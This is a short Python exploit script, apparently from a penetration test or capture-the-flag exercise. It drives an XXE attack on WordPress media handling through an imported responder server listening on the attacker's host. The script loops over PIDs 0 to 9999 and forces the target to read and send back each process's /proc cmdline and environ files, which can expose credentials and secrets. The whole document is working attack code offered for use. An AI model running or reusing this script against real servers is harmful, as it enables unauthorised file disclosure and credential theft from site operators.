#!/usr/bin/env python3
from wordpressMediaXXE import ResponderServer
from sys import argv

def enumProcs(responder: ResponderServer, pidRange: int):
    procFiles = ["cmdline", "environ"]
    for file in procFiles:
        for pid in range(pidRange):
            path = f"/proc/{pid}/{file}"
            print(path, flush=True, end='\r')
            responder.triggerXXE(path)


def main(lhost: str):
    pidRange = 10_000
    responder = ResponderServer(lhost, 5556)
    responder.start()
    try:
        enumProcs(responder, pidRange)
    except (Exception, KeyboardInterrupt) as exception:
        print(exception)
    responder.stop()

if __name__ == "__main__":
    if len(argv) < 2:
        print(f"Usage: {argv[0]} LHOST")
        exit(1)
    main(argv[1])
